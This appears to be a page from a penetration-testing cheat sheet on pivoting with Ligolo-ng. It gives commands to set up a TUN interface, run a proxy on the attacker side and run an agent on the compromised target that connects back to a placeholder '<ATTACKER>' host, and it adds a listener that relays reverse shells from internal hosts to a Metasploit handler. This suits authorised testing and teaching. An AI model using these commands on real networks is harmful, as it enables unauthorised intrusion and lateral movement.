# 08.03 Ligolo-ng

> Userspace tunneling tool — creates a TUN interface for the entire internal network in one command.

## Overview

Ligolo-ng creates a TUN interface on attacker side and forwards all matching traffic through the agent on the compromised host. Unlike SOCKS-based tools, this gives you native TCP/UDP/ICMP through the tunnel — `ping`, raw scans, anything works. The modern preferred pivot tool for internal pentest.

## Steps

- **Step 1** - Get proxy + agent binaries.
- **Step 2** - Set up TUN interface on attacker.
- **Step 3** - Run proxy on attacker, agent on target.
- **Step 4** - Add internal subnet routing.

## Commands

### Get binaries

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_*_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_*_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_*_windows_amd64.zip
```

### Set up TUN

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

### Run proxy (attacker)

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
# Wait for agent connection
```

### Run agent (target)

```bash
# Target — connect back to attacker
./agent -connect <ATTACKER>:11601 -ignore-cert
```

### In proxy console — set up tunnel

```text
ligolo-ng » session
  Specify a session: 1
[Agent : <USER>@<HOST>] » start
# Now add the internal subnet route on attacker side:
# (outside ligolo-ng)
sudo ip route add 10.10.0.0/16 dev ligolo
# Now nmap/curl/anything to 10.10.x.x works natively
```

### Listener — reverse tunnel

```text
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# Now metasploit handler on 127.0.0.1:4444 can catch reverse shells from internal hosts
```
